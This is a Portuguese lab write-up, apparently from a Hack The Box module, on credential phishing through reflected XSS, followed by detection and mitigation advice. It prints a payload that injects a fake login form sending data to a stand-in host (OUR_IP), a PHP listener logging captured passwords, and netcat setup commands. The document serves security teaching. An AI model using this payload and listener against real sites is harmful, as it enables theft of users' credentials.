# Phishing por meio de XSS

## O que é

Phishing por XSS combina uma vulnerabilidade de execução de JavaScript com engenharia social. O código injetado modifica uma página legítima para apresentar um formulário falso, fazendo com que dados inseridos pelo usuário sejam enviados a um servidor controlado pelo testador ou atacante.

Em uma simulação autorizada, essa técnica demonstra dois riscos:

- usuários tendem a confiar em formulários exibidos dentro de um domínio conhecido;
- XSS permite alterar a interface e o destino dos dados sem comprometer diretamente os arquivos do servidor.

## Cenário do laboratório

A aplicação é um visualizador de imagens que recebe uma URL:

<a href="../img/xss15.png">
  <img src="../img/xss15.png" alt="Visualizador de imagens usado no laboratório de phishing por XSS">
</a>

Um payload XSS básico não funciona e resulta apenas em uma imagem quebrada:

<a href="../img/xss16.png">
  <img src="../img/xss16.png" alt="Imagem quebrada após um payload incompatível com o contexto de injeção">
</a>

Isso ocorre porque o payload precisa ser compatível com o contexto HTML em que a URL é inserida. A análise do código-fonte revela quais delimitadores precisam ser encerrados e quais partes do HTML devem ser neutralizadas.

## Fluxo do ataque no laboratório

```text
URL com Reflected XSS
        ↓
JavaScript injeta um formulário falso
        ↓
Usuário envia username e password
        ↓
Requisição chega ao listener controlado
        ↓
Credenciais são registradas
        ↓
Usuário é redirecionado à aplicação original
```

Como é Reflected XSS, o payload não fica armazenado. Ele viaja nos parâmetros da URL e é executado quando a vítima abre aquela requisição específica.

## Construção do formulário

Formulário original apresentado no material:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

O atributo `action` determina para onde o navegador enviará os dados. `OUR_IP` deve representar o endereço da VM do laboratório, normalmente encontrado na interface `tun0` com `ip a`.

O código é minificado e inserido por `document.write()`:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```

<a href="../img/xss17.png">
  <img src="../img/xss17.png" alt="Formulário falso injetado por meio da vulnerabilidade Reflected XSS">
</a>

## Limpeza da interface

Para tornar a página coerente com a mensagem de login, o laboratório remove o formulário original. O Page Inspector mostra que ele possui o identificador `urlform`:

<a href="../img/xss18.png">
  <img src="../img/xss18.png" alt="Inspeção do elemento original com o identificador urlform">
</a>

```html
<form role="form" action="index.php" method="GET" id='urlform'>
    <input type="text" placeholder="Image URL" name="url">
</form>
```

Remoção do elemento:

```javascript
document.getElementById('urlform').remove();
```

Payload JavaScript combinado:

```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

<a href="../img/xss19.png">
  <img src="../img/xss19.png" alt="Formulário injetado depois da remoção do campo original de URL">
</a>

Um comentário HTML aberto após o payload neutraliza o restante do markup original:

```html
...PAYLOAD... <!-- 
```

<a href="../img/xss20.png">
  <img src="../img/xss20.png" alt="Resultado limpo da página com o formulário de login injetado">
</a>

## Recebimento da requisição

O primeiro teste usa Netcat na porta 80:

```shellsession
JLMreal@htb[/htb]$ sudo nc -lvnp 80
listening on [any] 80 ...
```

Ao enviar `test:test`, o navegador realiza:

```http
GET /?username=test&password=test&submit=Login HTTP/1.1
Host: 10.10.XX.XX
```

Os dados aparecem na query string porque o formulário não especifica `method`; em HTML, o método padrão é GET. Isso também significa que as credenciais podem ficar registradas no histórico, em logs e em componentes intermediários, reforçando por que senhas nunca devem ser enviadas dessa forma.

## Listener PHP e redirecionamento

O Netcat mostra a requisição, mas não responde como um servidor HTTP completo. O material utiliza o seguinte script para registrar os parâmetros e redirecionar o navegador:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

Preparação do servidor no laboratório:

```shellsession
JLMreal@htb[/htb]$ mkdir /tmp/tmpserver
JLMreal@htb[/htb]$ cd /tmp/tmpserver
JLMreal@htb[/htb]$ vi index.php #at this step we wrote our index.php file
JLMreal@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```

Após o envio, o navegador volta para a aplicação original:

<a href="../img/xss21.png">
  <img src="../img/xss21.png" alt="Redirecionamento para o visualizador de imagens original">
</a>

Verificação das credenciais de teste:

```shellsession
JLMreal@htb[/htb]$ cat creds.txt
Username: test | Password: test
```

## Por que a técnica é convincente

- o formulário aparece sob o domínio legítimo e vulnerável;
- a interface original pode ser removida ou substituída;
- o redirecionamento reduz sinais visíveis após o envio;
- usuários podem interpretar a solicitação como uma nova autenticação normal.

## Como identificar

- Procure parâmetros refletidos em atributos HTML, especialmente `src`, `href` e `action`.
- Compare o código-fonte recebido com o DOM renderizado.
- Verifique formulários cujo `action` aponta para origens inesperadas.
- Monitore alterações dinâmicas em formulários, títulos e elementos principais.
- Analise URLs extensas ou codificadas recebidas por mensagens.

## Mitigação

- Aplicar codificação de saída específica para o contexto.
- Validar URLs e permitir apenas esquemas e destinos esperados.
- Evitar Sinks perigosos como `document.write()` e `innerHTML` com dados não confiáveis.
- Preservar o escape automático dos frameworks.
- Implementar Content Security Policy, especialmente `script-src` e `form-action`, como defesa adicional.
- Usar autenticação multifator para reduzir o impacto de credenciais capturadas.
- Treinar usuários para verificar solicitações inesperadas de autenticação.
- Monitorar redirecionamentos, formulários externos e padrões de XSS nos logs.

## Observações importantes

- `form-action` em CSP pode impedir que um formulário envie dados a destinos não autorizados.
- Cookies com `HttpOnly` não impedem a criação de um formulário falso; eles apenas dificultam a leitura direta do cookie pelo JavaScript.
- A correção principal continua sendo eliminar a injeção XSS e impedir que entradas sejam interpretadas como HTML ou código.
- A técnica deve ser praticada exclusivamente em HTB, CTFs, laboratórios ou testes formalmente autorizados.
